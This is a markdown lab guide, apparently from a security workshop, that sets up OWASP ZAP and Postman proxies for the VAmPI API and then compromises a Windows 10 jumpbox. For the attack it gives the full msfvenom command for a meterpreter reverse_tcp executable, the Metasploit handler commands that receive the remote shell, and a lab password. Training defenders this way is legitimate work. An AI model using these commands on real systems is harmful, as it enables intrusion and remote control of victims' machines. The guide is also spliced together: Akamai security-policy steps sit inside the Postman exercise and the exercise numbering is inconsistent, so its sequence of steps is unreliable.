# Module 3


### Exercise 3.1 - OWASP ZAP and Postman Proxy Config

1. Click on **Activities** button in the top lefthand corner

2. Type **zap** in the search bar and click on the ![Zap-Icon](media/zap-launch-icon.jpg) to launch OWASP ZAP (herein referred to as ZAP)

3. Upon launch ZAP will ask if you want to persist your session, while a useful option, it isn't needed for this lab, so select **No, I don't want to persist this session at this moment in time** and click the **Start** button

4. Click on **Tools** menu on the ZAP main screen ![Tools-Menu](media/zap-main-screen-tools-menu.jpg)

5. In the **Tools** menu select **Options**
![Options](media/zap-tools-menu-options.jpg)

6. Type **network** in the search bar and hit the **Enter** key on your keyboard. Select **Network** --> **Local Servers/Proxies**. Here you could change the setting or add additional proxys. Just remember localhost for the proxy host and 8080 for the port.
![Proxy](media/zap-proxy-menu.jpg)

7. Click on **Activities** button in the top lefthand corner again and type **postman** into the search bar. Click on the Postman icon. [Postman-Icon](media/postman-icon.jpg)

8. In Postman select **File**->**Settings**->**Proxy**
![Postman-Settings](media/postman-settings-proxy.jpg)

9. Enable **Use custom proxy configuration** and match the settings seen below
![Postman-Proxy-Config](media/postman-proxy-config.jpg)

### Exercise 3.2 Running through Postman Collection

1. The VAmPI Postman Collection is already imported as is the VAmPI Environment 

2. Ensure you are using the VAmPI Environment by clicking the environment select near the top right of the window and selecting the VAmPI environment
![VAmPI-Environ](media/postman-environ-select.jpg)

3. Next select **Collections** on the left and expand the VAmPI collection
![VAmPI-Collection](media/postman-collections-vampi.jpg)

4. Run through all the steps in the collection
5. For **Security Template**, click the **Strict** option.

!!! note
    Choosing the **Strict** template allows for strict policy actions to block threats from your network including:
    - All known threat categories are assigned the block policy action
    - For known and suspected DNS exfiltration threats, a refused response is configured
    - A monitor action is assigned to the suspected malware and phishing threat
    - Alerts are enabled

6. Click **Continue**

![Policy Selection](media/policy-selection.png)

7. Click **Threat** and under the **Alert** table, make sure **Malware** and **Phising** are enabled for **Threat Type** and **Suspected Type**

8. Click **Save & Deploy**

![Policy Deploy](media/policydeploy.png)

9. Click **Deploy** again

### Exercise 1.3 - Attacking the Endpoint & Remediation

#### The Attack 
Our goal is to compromise the Win10 Jumpbox workstation to gain access to the machine through a Kali Linux terminal. We will be using Metasploit to gain access to the Windows machine. Metasploit is a popular penetration testing framework used to conduct active exploitation against a remote host. 

#### **Initial Access - Exploitation with Metasploit** 

<!-- **Overview** Let's start by gaining initial access to the Windows client from our attacker machine, Kali Linux. We will be setting up a reverse shell environment using the /reverse_tcp payload module with meterpreter. Meterpreter is an advanced, extensible payload that uses in-memory DDL injection stagers. It communicates over the stager socket and provides a comprehensive client-side API with features such as tab completion and commmand history. Meterpreter allows a user to gain access to a shell (or Windows CMD) and perform actions inside the computer. To compromise the host, we will simulate a "malicious" executable with our local web server setup. This will allow us to transfer our payload over to the victim machine -->

1. At the bottom taskbar, right click the Kali Linux icon and run as Admin. Do the same for the Command Prompt icon
!!! note
    When opening the Command Prompt Session, type in **bash** and make sure the directory it is currently in is **/mnt/c/Users/labuser**

2. In the Kali Linux window, type in **msfconsole**
!!! note   
    This will take a while to load

3. In the Command Prompt window, type in **ifconfig eth0** to obtain the IP Address of the Jumpbox. We will need it to launch the attack

4. In the Command Prompt window, type in **sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.2.2 LPORT=4444 -o /mnt/c/Users/labuser/something32.exe**. This will create an infected .exe file that willl serve as a payload for the Windows 10 machine.

![Bash](media/bash_setup.png)

!!! note
    This will also take a while to load. If prompted for password, input **WWTwwt1!**

5. Click the **Kali Linux** icon on the Windows startbar and type **msfconsole** to launch the Metasploit Console. Once Metasploit is launched on the Kali Linux window, type the following:

**use multi/handler** *This is the general payload handler

**set payload windows/meterpreter/reverse_tcp** *This will configure the payload to match what's inside the infected executable

**set LHOST 192.168.2.2**  *This sets the IP as the listening host

**set LPORT 4444** *This sets the listening port

**exploit** *runs the exploit

![Metasploit](media/metasploit.png)

6. Go locate the executable file **something32** (C:\Users\labuser), double click the executable and monitor the Kali Linux window. As you can see, the file causes the payload to run and creates a connection to the attack machine. We then get a Meterpreter session on Kali Linux.

![Payload](media/something32.png)

![Exploit Assign](media/exploit.png)
    
!!! note
    For the sake of brevity, this lab not explore into Meterpreter, but there are various commands availiable that can be used to gather more information from the vulnerable machine
    

#### Remediation

7. Go back into the Akamai Enterprise Center. On the left hand side, click **Threat Protection->Reports->Threat Events** and from this view, you should be able to see Threat tables for **Category, Reason, Severity, Location, and Policy**